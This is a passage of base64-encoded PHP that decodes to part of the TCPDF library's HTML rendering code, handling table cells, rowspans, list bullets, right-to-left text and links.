nZSddIDwgJHRoaXMtPnBhZ2UpIE9SICgkdHJ3c3BbJ3N0YXJ0Y29sdW1uJ10gPCAkdGhpcy0+Y3VycmVudF9jb2x1bW4pKSkgewoJCQkJCQkJCQkvLyBzZXQgdGhlIHN0YXJ0aW5nIFggcG9zaXRpb24gb2YgdGhlIGN1cnJlbnQgY2VsbAoJCQkJCQkJCQkkdGhpcy0+eCA9ICRyc2VuZHggKyAkY2VsbHNwYWNpbmd4OwoJCQkJCQkJCQkvLyBpbmNyZW1lbnQgY29sdW1uIGluZGljYXRvcgoJCQkJCQkJCQkkY29saWQgKz0gJHRyd3NwWydjb2xzcGFuJ107CgkJCQkJCQkJCWlmICgoJHRyd3NwWydyb3dzcGFuJ10gPT0gMSkKCQkJCQkJCQkJCUFORCAoaXNzZXQoJGRvbVskdHJpZF1bJ2VuZHknXSkpCgkJCQkJCQkJCQlBTkQgKGlzc2V0KCRkb21bJHRyaWRdWydlbmRwYWdlJ10pKQoJCQkJCQkJCQkJQU5EIChpc3NldCgkZG9tWyR0cmlkXVsnZW5kY29sdW1uJ10pKQoJCQkJCQkJCQkJQU5EICgkdHJ3c3BbJ2VuZHBhZ2UnXSA9PSAkZG9tWyR0cmlkXVsnZW5kcGFnZSddKQoJCQkJCQkJCQkJQU5EICgkdHJ3c3BbJ2VuZGNvbHVtbiddID09ICRkb21bJHRyaWRdWydlbmRjb2x1bW4nXSkpIHsKCQkJCQkJCQkJCS8vIHNldCBlbmRpbmcgWSBwb3NpdGlvbiBmb3Igcm93CgkJCQkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJHJza11bJ2VuZHknXSA9IG1heCgkZG9tWyR0cmlkXVsnZW5keSddLCAkdHJ3c3BbJ2VuZHknXSk7CgkJCQkJCQkJCQkkZG9tWyR0cmlkXVsnZW5keSddID0gJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRyc2tdWydlbmR5J107CgkJCQkJCQkJCX0KCQkJCQkJCQkJJHJzayA9IDA7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJKyskcnNrOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRvbVskcGFyZW50aWRdWyd3aWR0aCddKSkgewoJCQkJCQkJLy8gdXNlciBzcGVjaWZpZWQgd2lkdGgKCQkJCQkJCSRjZWxsdyA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGRvbVskcGFyZW50aWRdWyd3aWR0aCddLCAkdGFibGVfY29sdW1uc193aWR0aCwgJ3B4Jyk7CgkJCQkJCQkkdG1wY3cgPSAoJGNlbGx3IC8gJGNvbHNwYW4pOwoJCQkJCQkJZm9yICgkaSA9IDA7ICRpIDwgJGNvbHNwYW47ICsrJGkpIHsKCQkJCQkJCQkkdGFibGVfY29sd2lkdGhzWygkY29saWQgKyAkaSldID0gJHRtcGN3OwoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgewoJCQkJCQkJLy8gaW5oZXJpdCBjb2x1bW4gd2lkdGgKCQkJCQkJCSRjZWxsdyA9IDA7CgkJCQkJCQlmb3IgKCRpID0gMDsgJGkgPCAkY29sc3BhbjsgKyskaSkgewoJCQkJCQkJCSRjZWxsdyArPSAoaXNzZXQoJHRhYmxlX2NvbHdpZHRoc1soJGNvbGlkICsgJGkpXSkgPyAkdGFibGVfY29sd2lkdGhzWygkY29saWQgKyAkaSldIDogMCk7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJJGNlbGx3ICs9ICgoJGNvbHNwYW4gLSAxKSAqICRjZWxsc3BhY2luZ1snSCddKTsKCQkJCQkJLy8gaW5jcmVtZW50IGNvbHVtbiBpbmRpY2F0b3IKCQkJCQkJJGNvbGlkICs9ICRjb2xzcGFuOwoJCQkJCQkvLyBhZGQgcm93c3BhbiBpbmZvcm1hdGlvbiB0byB0YWJsZSBlbGVtZW50CgkJCQkJCWlmICgkcm93c3BhbiA+IDEpIHsKCQkJCQkJCSR0cnNpZCA9IGFycmF5X3B1c2goJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddLCBhcnJheSgndHJpZCcgPT4gJHRyaWQsICdyb3dzcGFuJyA9PiAkcm93c3BhbiwgJ21yb3dzcGFuJyA9PiAkcm93c3BhbiwgJ2NvbHNwYW4nID0+ICRjb2xzcGFuLCAnc3RhcnRwYWdlJyA9PiAkdGhpcy0+cGFnZSwgJ3N0YXJ0Y29sdW1uJyA9PiAkdGhpcy0+Y3VycmVudF9jb2x1bW4sICdzdGFydHgnID0+ICR0aGlzLT54LCAnc3RhcnR5JyA9PiAkdGhpcy0+eSkpOwoJCQkJCQl9CgkJCQkJCSRjZWxsaWQgPSBhcnJheV9wdXNoKCRkb21bJHRyaWRdWydjZWxscG9zJ10sIGFycmF5KCdzdGFydHgnID0+ICR0aGlzLT54KSk7CgkJCQkJCWlmICgkcm93c3BhbiA+IDEpIHsKCQkJCQkJCSRkb21bJHRyaWRdWydjZWxscG9zJ11bKCRjZWxsaWQgLSAxKV1bJ3Jvd3NwYW5pZCddID0gKCR0cnNpZCAtIDEpOwoJCQkJCQl9CgkJCQkJCS8vIHB1c2ggYmFja2dyb3VuZCBjb2xvcnMKCQkJCQkJaWYgKGlzc2V0KCRkb21bJHBhcmVudGlkXVsnYmdjb2xvciddKSBBTkQgKCRkb21bJHBhcmVudGlkXVsnYmdjb2xvciddICE9PSBmYWxzZSkpIHsKCQkJCQkJCSRkb21bJHRyaWRdWydjZWxscG9zJ11bKCRjZWxsaWQgLSAxKV1bJ2JnY29sb3InXSA9ICRkb21bJHBhcmVudGlkXVsnYmdjb2xvciddOwoJCQkJCQl9CgkJCQkJCS8vIHN0b3JlIGJvcmRlciBpbmZvCgkJCQkJCWlmICghZW1wdHkoJHRkYm9yZGVyKSkgewoJCQkJCQkJJGRvbVskdHJpZF1bJ2NlbGxwb3MnXVsoJGNlbGxpZCAtIDEpXVsnYm9yZGVyJ10gPSAkdGRib3JkZXI7CgkJCQkJCX0KCQkJCQkJJHByZXZMYXN0SCA9ICR0aGlzLT5sYXN0aDsKCQkJCQkJLy8gc3RvcmUgc29tZSBpbmZvIGZvciBtdWx0aWNvbHVtbiBtb2RlCgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkdGhpcy0+Y29seHNoaWZ0Wyd4J10gPSAkdGhpcy0+dyAtICR0aGlzLT54IC0gJHRoaXMtPnJNYXJnaW47CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdGhpcy0+Y29seHNoaWZ0Wyd4J10gPSAkdGhpcy0+eCAtICR0aGlzLT5sTWFyZ2luOwoJCQkJCQl9CgkJCQkJCSR0aGlzLT5jb2x4c2hpZnRbJ3MnXSA9ICRjZWxsc3BhY2luZzsKCQkJCQkJJHRoaXMtPmNvbHhzaGlmdFsncCddID0gJGN1cnJlbnRfY2VsbF9wYWRkaW5nOwoJCQkJCQkvLyAqKioqKiogd3JpdGUgdGhlIGNlbGwgY29udGVudCAqKioqKioKCQkJCQkJJHRoaXMtPk11bHRpQ2VsbCgkY2VsbHcsICRjZWxsaCwgJGNlbGxfY29udGVudCwgZmFsc2UsICRsYWxpZ24sIGZhbHNlLCAyLCAnJywgJycsIHRydWUsIDAsIHRydWUsIHRydWUsIDAsICdUJywgZmFsc2UpOwoJCQkJCQkvLyByZXN0b3JlIHNvbWUgdmFsdWVzCgkJCQkJCSR0aGlzLT5jb2x4c2hpZnQgPSBhcnJheSgneCcgPT4gMCwgJ3MnID0+IGFycmF5KCdIJyA9PiAwLCAnVicgPT4gMCksICdwJyA9PiBhcnJheSgnTCcgPT4gMCwgJ1QnID0+IDAsICdSJyA9PiAwLCAnQicgPT4gMCkpOwoJCQkJCQkkdGhpcy0+bGFzdGggPSAkcHJldkxhc3RIOwoJCQkJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJG9sZF9jZWxsX3BhZGRpbmc7CgkJCQkJCSRkb21bJHRyaWRdWydjZWxscG9zJ11bKCRjZWxsaWQgLSAxKV1bJ2VuZHgnXSA9ICR0aGlzLT54OwoJCQkJCQkvLyB1cGRhdGUgdGhlIGVuZCBvZiByb3cgcG9zaXRpb24KCQkJCQkJaWYgKCRyb3dzcGFuIDw9IDEpIHsKCQkJCQkJCWlmIChpc3NldCgkZG9tWyR0cmlkXVsnZW5keSddKSkgewoJCQkJCQkJCWlmICgoJHRoaXMtPnBhZ2UgPT0gJGRvbVskdHJpZF1bJ2VuZHBhZ2UnXSkgQU5EICgkdGhpcy0+Y3VycmVudF9jb2x1bW4gPT0gJGRvbVskdHJpZF1bJ2VuZGNvbHVtbiddKSkgewoJCQkJCQkJCQkkZG9tWyR0cmlkXVsnZW5keSddID0gbWF4KCR0aGlzLT55LCAkZG9tWyR0cmlkXVsnZW5keSddKTsKCQkJCQkJCQl9IGVsc2VpZiAoKCR0aGlzLT5wYWdlID4gJGRvbVskdHJpZF1bJ2VuZHBhZ2UnXSkgT1IgKCR0aGlzLT5jdXJyZW50X2NvbHVtbiA+ICRkb21bJHRyaWRdWydlbmRjb2x1bW4nXSkpIHsKCQkJCQkJCQkJJGRvbVskdHJpZF1bJ2VuZHknXSA9ICR0aGlzLT55OwoJCQkJCQkJCX0KCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJGRvbVskdHJpZF1bJ2VuZHknXSA9ICR0aGlzLT55OwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRkb21bJHRyaWRdWydlbmRwYWdlJ10pKSB7CgkJCQkJCQkJJGRvbVskdHJpZF1bJ2VuZHBhZ2UnXSA9IG1heCgkdGhpcy0+cGFnZSwgJGRvbVskdHJpZF1bJ2VuZHBhZ2UnXSk7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRkb21bJHRyaWRdWydlbmRwYWdlJ10gPSAkdGhpcy0+cGFnZTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkZG9tWyR0cmlkXVsnZW5kY29sdW1uJ10pKSB7CgkJCQkJCQkJJGRvbVskdHJpZF1bJ2VuZGNvbHVtbiddID0gbWF4KCR0aGlzLT5jdXJyZW50X2NvbHVtbiwgJGRvbVskdHJpZF1bJ2VuZGNvbHVtbiddKTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJGRvbVskdHJpZF1bJ2VuZGNvbHVtbiddID0gJHRoaXMtPmN1cnJlbnRfY29sdW1uOwoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgewoJCQkJCQkJLy8gYWNjb3VudCBmb3Igcm93LXNwYW5uZWQgY2VsbHMKCQkJCQkJCSRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVsoJHRyc2lkIC0gMSldWydlbmR4J10gPSAkdGhpcy0+eDsKCQkJCQkJCSRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVsoJHRyc2lkIC0gMSldWydlbmR5J10gPSAkdGhpcy0+eTsKCQkJCQkJCSRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVsoJHRyc2lkIC0gMSldWydlbmRwYWdlJ10gPSAkdGhpcy0+cGFnZTsKCQkJCQkJCSRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVsoJHRyc2lkIC0gMSldWydlbmRjb2x1bW4nXSA9ICR0aGlzLT5jdXJyZW50X2NvbHVtbjsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddKSkgewoJCQkJCQkJLy8gdXBkYXRlIGVuZHkgYW5kIGVuZHBhZ2Ugb24gcm93c3Bhbm5lZCBjZWxscwoJCQkJCQkJZm9yZWFjaCAoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddIGFzICRrID0+ICR0cndzcCkgewoJCQkJCQkJCWlmICgkdHJ3c3BbJ3Jvd3NwYW4nXSA+IDApIHsKCQkJCQkJCQkJaWYgKGlzc2V0KCRkb21bJHRyaWRdWydlbmRwYWdlJ10pKSB7CgkJCQkJCQkJCQlpZiAoKCR0cndzcFsnZW5kcGFnZSddID09ICRkb21bJHRyaWRdWydlbmRwYWdlJ10pIEFORCAoJHRyd3NwWydlbmRjb2x1bW4nXSA9PSAkZG9tWyR0cmlkXVsnZW5kY29sdW1uJ10pKSB7CgkJCQkJCQkJCQkJJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5keSddID0gbWF4KCRkb21bJHRyaWRdWydlbmR5J10sICR0cndzcFsnZW5keSddKTsKCQkJCQkJCQkJCX0gZWxzZWlmICgoJHRyd3NwWydlbmRwYWdlJ10gPCAkZG9tWyR0cmlkXVsnZW5kcGFnZSddKSBPUiAoJHRyd3NwWydlbmRjb2x1bW4nXSA8ICRkb21bJHRyaWRdWydlbmRjb2x1bW4nXSkpIHsKCQkJCQkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmR5J10gPSAkZG9tWyR0cmlkXVsnZW5keSddOwoJCQkJCQkJCQkJCSRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZHBhZ2UnXSA9ICRkb21bJHRyaWRdWydlbmRwYWdlJ107CgkJCQkJCQkJCQkJJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kY29sdW1uJ10gPSAkZG9tWyR0cmlkXVsnZW5kY29sdW1uJ107CgkJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJCSRkb21bJHRyaWRdWydlbmR5J10gPSAkdGhpcy0+cGFnZWRpbVskZG9tWyR0cmlkXVsnZW5kcGFnZSddXVsnaGsnXSAtICR0aGlzLT5wYWdlZGltWyRkb21bJHRyaWRdWydlbmRwYWdlJ11dWydibSddOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCSR0aGlzLT54ICs9ICgkY2VsbHNwYWNpbmd4IC8gMik7CgkJCQkJfSBlbHNlIHsKCQkJCQkJLy8gb3BlbmluZyB0YWcgKG9yIHNlbGYtY2xvc2luZyB0YWcpCgkJCQkJCWlmICghaXNzZXQoJG9wZW50YWdwb3MpKSB7CgkJCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkJCQkJCSRvcGVudGFncG9zID0gc3RybGVuKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddKTsKCQkJCQkJCX0gZWxzZWlmICghJHRoaXMtPkluRm9vdGVyKSB7CgkJCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHRoaXMtPnBhZ2VdKSkgewoJCQkJCQkJCQkkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXSAtICR0aGlzLT5mb290ZXJsZW5bJHRoaXMtPnBhZ2VdOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSR0aGlzLT5mb290ZXJwb3NbJHRoaXMtPnBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHRoaXMtPnBhZ2VdOwoJCQkJCQkJCX0KCQkJCQkJCQkkb3BlbnRhZ3BvcyA9ICR0aGlzLT5mb290ZXJwb3NbJHRoaXMtPnBhZ2VdOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCSRkb20gPSAkdGhpcy0+b3BlbkhUTUxUYWdIYW5kbGVyKCRkb20sICRrZXksICRjZWxsKTsKCQkJCQl9CgkJCQl9IGVsc2UgeyAvLyBjbG9zaW5nIHRhZwoJCQkJCSRwcmV2X251bXBhZ2VzID0gJHRoaXMtPm51bXBhZ2VzOwoJCQkJCSRvbGRfYm9yZGVybXJrID0gJHRoaXMtPmJvcmRlcm1ya1skdGhpcy0+cGFnZV07CgkJCQkJJGRvbSA9ICR0aGlzLT5jbG9zZUhUTUxUYWdIYW5kbGVyKCRkb20sICRrZXksICRjZWxsLCAkbWF4Ym90dG9tbGluZXkpOwoJCQkJCWlmICgkdGhpcy0+Ym9yZGVybXJrWyR0aGlzLT5wYWdlXSA+ICRvbGRfYm9yZGVybXJrKSB7CgkJCQkJCSRzdGFydGxpbmVwb3MgKz0gKCR0aGlzLT5ib3JkZXJtcmtbJHRoaXMtPnBhZ2VdIC0gJG9sZF9ib3JkZXJtcmspOwoJCQkJCX0KCQkJCQlpZiAoJHByZXZfbnVtcGFnZXMgPiAkdGhpcy0+bnVtcGFnZXMpIHsKCQkJCQkJJHN0YXJ0bGluZXBhZ2UgPSAkdGhpcy0+cGFnZTsKCQkJCQl9CgkJCQl9CgkJCX0gZWxzZWlmIChzdHJsZW4oJGRvbVska2V5XVsndmFsdWUnXSkgPiAwKSB7CgkJCQkvLyBwcmludCBsaXN0LWl0ZW0KCQkJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmxpc3BhY2VyKSBBTkQgKCR0aGlzLT5saXNwYWNlciAhPSAnXicpKSB7CgkJCQkJJHRoaXMtPnNldEZvbnQoJHBmb250bmFtZSwgJHBmb250c3R5bGUsICRwZm9udHNpemUpOwoJCQkJCSR0aGlzLT5yZXNldExhc3RIKCk7CgkJCQkJJG1pbnN0YXJ0bGluZXkgPSAkdGhpcy0+eTsKCQkJCQkkbWF4Ym90dG9tbGluZXkgPSAoJHN0YXJ0bGluZXkgKyAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpKTsKCQkJCQlpZiAoaXNfbnVtZXJpYygkcGZvbnRzaXplKSBBTkQgKCRwZm9udHNpemUgPiAwKSkgewoJCQkJCQkkdGhpcy0+cHV0SHRtbExpc3RCdWxsZXQoJHRoaXMtPmxpc3RudW0sICR0aGlzLT5saXNwYWNlciwgJHBmb250c2l6ZSk7CgkJCQkJfQoJCQkJCSR0aGlzLT5zZXRGb250KCRjdXJmb250bmFtZSwgJGN1cmZvbnRzdHlsZSwgJGN1cmZvbnRzaXplKTsKCQkJCQkkdGhpcy0+cmVzZXRMYXN0SCgpOwoJCQkJCWlmIChpc19udW1lcmljKCRwZm9udHNpemUpIEFORCAoJHBmb250c2l6ZSA+IDApIEFORCBpc19udW1lcmljKCRjdXJmb250c2l6ZSkgQU5EICgkY3VyZm9udHNpemUgPiAwKSBBTkQgKCRwZm9udHNpemUgIT0gJGN1cmZvbnRzaXplKSkgewoJCQkJCQkkcGZvbnRhc2NlbnQgPSAkdGhpcy0+Z2V0Rm9udEFzY2VudCgkcGZvbnRuYW1lLCAkcGZvbnRzdHlsZSwgJHBmb250c2l6ZSk7CgkJCQkJCSRwZm9udGRlc2NlbnQgPSAkdGhpcy0+Z2V0Rm9udERlc2NlbnQoJHBmb250bmFtZSwgJHBmb250c3R5bGUsICRwZm9udHNpemUpOwoJCQkJCQkkdGhpcy0+eSArPSAoJHRoaXMtPmdldENlbGxIZWlnaHQoKCRwZm9udHNpemUgLSAkY3VyZm9udHNpemUpIC8gJHRoaXMtPmspICsgJHBmb250YXNjZW50IC0gJGN1cmZvbnRhc2NlbnQgLSAkcGZvbnRkZXNjZW50ICsgJGN1cmZvbnRkZXNjZW50KSAvIDI7CgkJCQkJCSRtaW5zdGFydGxpbmV5ID0gbWluKCR0aGlzLT55LCAkbWluc3RhcnRsaW5leSk7CgkJCQkJCSRtYXhib3R0b21saW5leSA9IG1heCgoJHRoaXMtPnkgKyAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkcGZvbnRzaXplIC8gJHRoaXMtPmspKSwgJG1heGJvdHRvbWxpbmV5KTsKCQkJCQl9CgkJCQl9CgkJCQkvLyB0ZXh0CgkJCQkkdGhpcy0+aHRtbHZzcGFjZSA9IDA7CgkJCQkkaXNSVExTdHJpbmcgPSBwcmVnX21hdGNoKFRDUERGX0ZPTlRfREFUQTo6JHVuaV9SRV9QQVRURVJOX1JUTCwgJGRvbVska2V5XVsndmFsdWUnXSkgfHwgcHJlZ19tYXRjaChUQ1BERl9GT05UX0RBVEE6OiR1bmlfUkVfUEFUVEVSTl9BUkFCSUMsICRkb21bJGtleV1bJ3ZhbHVlJ10pOwoJCQkJaWYgKCghJHRoaXMtPnByZW1vZGUpIEFORCAkdGhpcy0+aXNSVExUZXh0RGlyKCkgQU5EICEkaXNSVExTdHJpbmcpIHsKCQkJCQkvLyByZXZlcnNlIHNwYWNlcyBvcmRlcgoJCQkJCSRsc3AgPSAnJzsgLy8gbGVmdCBzcGFjZXMKCQkJCQkkcnNwID0gJyc7IC8vIHJpZ2h0IHNwYWNlcwoJCQkJCWlmIChwcmVnX21hdGNoKCcvXignLiR0aGlzLT5yZV9zcGFjZVsncCddLicrKS8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAkZG9tWyRrZXldWyd2YWx1ZSddLCAkbWF0Y2hlcykpIHsKCQkJCQkJJGxzcCA9ICRtYXRjaGVzWzFdOwoJCQkJCX0KCQkJCQlpZiAocHJlZ19tYXRjaCgnLygnLiR0aGlzLT5yZV9zcGFjZVsncCddLicrKSQvJy4kdGhpcy0+cmVfc3BhY2VbJ20nXSwgJGRvbVska2V5XVsndmFsdWUnXSwgJG1hdGNoZXMpKSB7CgkJCQkJCSRyc3AgPSAkbWF0Y2hlc1sxXTsKCQkJCQl9CgkJCQkJJGRvbVska2V5XVsndmFsdWUnXSA9ICRyc3AuJHRoaXMtPnN0cmluZ1RyaW0oJGRvbVska2V5XVsndmFsdWUnXSkuJGxzcDsKCQkJCX0KCQkJCWlmICgkbmV3bGluZSkgewoJCQkJCWlmICghJHRoaXMtPnByZW1vZGUpIHsKCQkJCQkJJHByZWxlbiA9IHN0cmxlbigkZG9tWyRrZXldWyd2YWx1ZSddKTsKCQkJCQkJaWYgKCR0aGlzLT5pc1JUTFRleHREaXIoKSBBTkQgISRpc1JUTFN0cmluZykgewoJCQkJCQkJLy8gcmlnaHQgdHJpbSBleGNlcHQgbm9uLWJyZWFraW5nIHNwYWNlCgkJCQkJCQkkZG9tWyRrZXldWyd2YWx1ZSddID0gJHRoaXMtPnN0cmluZ1JpZ2h0VHJpbSgkZG9tWyRrZXldWyd2YWx1ZSddKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCS8vIGxlZnQgdHJpbSBleGNlcHQgbm9uLWJyZWFraW5nIHNwYWNlCgkJCQkJCQkkZG9tWyRrZXldWyd2YWx1ZSddID0gJHRoaXMtPnN0cmluZ0xlZnRUcmltKCRkb21bJGtleV1bJ3ZhbHVlJ10pOwoJCQkJCQl9CgkJCQkJCSRwb3N0bGVuID0gc3RybGVuKCRkb21bJGtleV1bJ3ZhbHVlJ10pOwoJCQkJCQlpZiAoKCRwb3N0bGVuID09IDApIEFORCAoJHByZWxlbiA+IDApKSB7CgkJCQkJCQkkZG9tWyRrZXldWyd0cmltbWVkX3NwYWNlJ10gPSB0cnVlOwoJCQkJCQl9CgkJCQkJfQoJCQkJCSRuZXdsaW5lID0gZmFsc2U7CgkJCQkJJGZpcnN0YmxvY2sgPSB0cnVlOwoJCQkJfSBlbHNlIHsKCQkJCQkkZmlyc3RibG9jayA9IGZhbHNlOwoJCQkJCS8vIHJlcGxhY2UgZW1wdHkgbXVsdGlwbGUgc3BhY2VzIHN0cmluZyB3aXRoIGEgc2luZ2xlIHNwYWNlCgkJCQkJJGRvbVska2V5XVsndmFsdWUnXSA9IHByZWdfcmVwbGFjZSgnL14nLiR0aGlzLT5yZV9zcGFjZVsncCddLicrJC8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCBjaHIoMzIpLCAkZG9tWyRrZXldWyd2YWx1ZSddKTsKCQkJCX0KCQkJCSRzdHJyZXN0ID0gJyc7CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT54IC09ICR0aGlzLT50ZXh0aW5kZW50OwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+eCArPSAkdGhpcy0+dGV4dGluZGVudDsKCQkJCX0KCQkJCWlmICghaXNzZXQoJGRvbVska2V5XVsndHJpbW1lZF9zcGFjZSddKSBPUiAhJGRvbVska2V5XVsndHJpbW1lZF9zcGFjZSddKSB7CgkJCQkJJHN0cmxpbmVsZW4gPSAkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJGRvbVska2V5XVsndmFsdWUnXSk7CgkJCQkJaWYgKCFlbXB0eSgkdGhpcy0+SFJFRikgQU5EIChpc3NldCgkdGhpcy0+SFJFRlsndXJsJ10pKSkgewoJCQkJCQkvLyBIVE1MIDxhPiBMaW5rCgkJCQkJCSRocmVmY29sb3IgPSAnJzsKCQkJCQkJaWYgKGlzc2V0KCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2ZnY29sb3InXSkgQU5EICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydmZ2NvbG9yJ10gIT09IGZhbHNlKSkgewoJCQkJCQkJJGhyZWZjb2xvciA9ICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2ZnY29sb3InXTsKCQkJCQkJfQoJCQkJCQkkaHJlZnN0eWxlID0gLTE7CgkJCQkJCWlmIChpc3NldCgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydmb250c3R5bGUnXSkgQU5EICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydmb250c3R5bGUnXSAhPT0gZmFsc2UpKSB7CgkJCQkJCQkkaHJlZnN0eWxlID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZm9udHN0eWxlJ107CgkJCQkJCX0KCQkJCQkJJHN0cnJlc3QgPSAkdGhpcy0+YWRkSHRtbExpbmsoJHRoaXMtPkhSRUZbJ3VybCddLCAkZG9tWyRrZXldWyd2YWx1ZSddLCAkd2ZpbGwsIHRydWUsICRocmVmY29sb3IsICRocmVmc3R5bGUsIHRydWUpOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSR3YWRqID0gMDsgLy8gc3BhY2UgdG8gbGVhdmUgZm9yIGJsb2NrIGNvbnRpbnVpdHkKCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCSRjd2EgPSAoJHRoaXMtPnggLSAkdGhpcy0+bE1hcmdpbik7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkY3dhID0gKCR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkdGhpcy0+eCk7CgkJCQkJCX0KCQkJCQkJaWYgKCgkc3RybGluZWxlbiA8ICRjd2EpIEFORCAoaXNzZXQoJGRvbVsoJGtleSArIDEpXSkpIEFORCAoJGRvbVsoJGtleSArIDEpXVsndGFnJ10pIEFORCAoISRkb21bKCRrZXkgKyAxKV1bJ2Jsb2NrJ10pKSB7CgkJCQkJCQkvLyBjaGVjayB0aGUgbmV4dCB0ZXh0IGJsb2NrcyBmb3IgY29udGludWl0eQoJCQkJCQkJJG5rZXkgPSAoJGtleSArIDEpOwoJCQkJCQkJJHdyaXRlX2Jsb2NrID0gdHJ1ZTsKCQkJCQkJCSRzYW1lX3RleHRkaXIgPSB0cnVlOwoJCQkJCQkJJHRtcF9mb250bmFtZSA9ICR0aGlzLT5Gb250RmFtaWx5OwoJCQkJCQkJJHRtcF9mb250c3R5bGUgPSAkdGhpcy0+Rm9udFN0eWxlOwoJCQkJCQkJJHRtcF9mb250c2l6ZSA9ICR0aGlzLT5Gb250U2l6ZVB0OwoJCQkJCQkJd2hpbGUgKCR3cml0ZV9ibG9jayBBTkQgaXNzZXQoJGRvbVskbmtleV0pKSB7CgkJCQkJCQkJaWYgKCRkb21bJG5rZXldWyd0YWcnXSkgewoJCQkJCQkJCQlpZiAoJGRvbVskbmtleV1bJ2Jsb2NrJ10pIHsKCQkJCQkJCQkJCS8vIGVuZCBvZiBibG9jawoJCQkJCQkJCQkJJHdyaXRlX2Jsb2NrID0gZmFsc2U7CgkJCQkJCQkJCX0KCQkJCQkJCQkJJHRtcF9mb250bmFtZSA9IGlzc2V0KCRkb21bJG5rZXldWydmb250bmFtZSddKSA/ICRkb21bJG5rZXldWydmb250bmFtZSddIDogJHRoaXMtPkZvbnRGYW1pbHk7CgkJCQkJCQkJCSR0bXBfZm9udHN0eWxlID0gaXNzZXQoJGRvbVskbmtleV1bJ2ZvbnRzdHlsZSddKSA/ICRkb21bJG5rZXldWydmb250c3R5bGUnXSA6ICR0aGlzLT5Gb250U3R5bGU7CgkJCQkJCQkJCSR0bXBfZm9udHNpemUgPSBpc3NldCgkZG9tWyRua2V5XVsnZm9udHNpemUnXSkgPyAkZG9tWyRua2V5XVsnZm9udHNpemUnXSA6ICR0aGlzLT5Gb250U2l6ZVB0OwoJCQkJCQkJCQkkc2FtZV90ZXh0ZGlyID0gKCRkb21bJG5rZXldWydkaXInXSA9PSAkZG9tWyRrZXldWydkaXInXSk7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJG5leHRzdHIgPSBUQ1BERl9TVEFUSUM6OnByZWdTcGxpdCgnLycuJHRoaXMtPnJlX3NwYWNlWydwJ10uJysvJywgJHRoaXMtPnJlX3NwYWNlWydtJ10sICRkb21bJG5rZXldWyd2YWx1ZSddKTsKCQkJCQkJCQkJaWYgKGlzc2V0KCRuZXh0c3RyWzBdKSBBTkQgJHNhbWVfdGV4dGRpcikgewoJCQkJCQkJCQkJJHdhZGogKz0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCRuZXh0c3RyWzBdLCAkdG1wX2ZvbnRuYW1lL